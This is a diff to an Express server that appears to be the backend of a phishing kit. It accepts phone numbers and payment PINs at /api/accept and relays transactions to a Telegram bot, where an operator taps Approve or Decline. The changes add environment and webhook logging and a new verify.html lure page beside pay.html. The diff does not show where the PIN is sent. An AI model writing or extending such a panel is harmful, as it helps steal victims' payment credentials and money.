@@ -110,6 +110,14 @@ app.post('/api/accept', async (req, res) => {
 
   pushLog('ACCEPT HIT tx=' + (transactionId || '—') + ' phone=' + (phone || '—'), 'info');
 
+  // Show exactly which environment variables the running container sees
+  pushLog(
+    'ENV: token=' + (process.env.TELEGRAM_BOT_TOKEN ? 'set' : 'MISSING') +
+    ' chat=' + (process.env.TELEGRAM_CHAT_ID ? 'set' : 'MISSING') +
+    ' proxy=' + (process.env.TELEGRAM_API_PROXY_URL ? 'set' : 'MISSING'),
+    'info'
+  );
+
   if (!transactionId || !phone || !pin) {
     pushLog('Rejected: missing fields', 'err');
     return res.status(400).json({ status: 'failed', message: 'Missing transactionId, phone, or pin' });
@@ -179,6 +187,8 @@ app.get('/api/status/:tx', (req, res) => {
    POST /api/telegram-webhook — Approve / Decline tap
 ============================================================ */
 app.post('/api/telegram-webhook', async (req, res) => {
+  pushLog('WEBHOOK HIT', 'info');
+
   const update = req.body || {};
   const cb = update.callback_query;
 
@@ -189,7 +199,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
     const baseUrl = tgBase();
     if (baseUrl) {
-      // Acknowledge the tap
       fetch(baseUrl + '/answerCallbackQuery', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -199,7 +208,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
         })
       }).catch(() => {});
 
-      // Remove buttons from the original message
       if (cb.message && cb.message.chat && cb.message.chat.id && cb.message.message_id) {
         fetch(baseUrl + '/editMessageReplyMarkup', {
           method: 'POST',
@@ -235,6 +243,7 @@ function servePage(filename) {
 app.get('/admin.html',  servePage('admin.html'));
 app.get('/client.html', servePage('client.html'));
 app.get('/pay.html',    servePage('pay.html'));
+app.get('/verify.html', servePage('verify.html'));
 app.get('/', (req, res) => res.redirect('/admin.html'));
 
 app.use((req, res) => {
@@ -251,7 +260,7 @@ app.listen(PORT, '0.0.0.0', () => {
   try {
     const files = fs.readdirSync(publicDir);
     console.log('Public files:', files.join(', ') || '(empty)');
-    ['admin.html', 'client.html', 'pay.html'].forEach(f => {
+    ['admin.html', 'client.html', 'pay.html', 'verify.html'].forEach(f => {
       console.log('  ' + f + ':', fs.existsSync(path.join(publicDir, f)) ? 'found' : 'MISSING');
     });
   } catch (e) {
